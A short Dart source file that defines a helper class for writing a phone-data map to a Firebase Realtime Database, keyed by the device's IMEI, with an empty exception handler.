import 'dart:convert';

import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';

class FirebaseLog {
  logPhoneData(var x) async {
    try {
      final DatabaseReference _logData =
          FirebaseDatabase.instance.ref().child('Data');
      _logData.child(x["imei"]).set(x);
    } on Exception catch (e) {
      // TODO
    }
  }
}
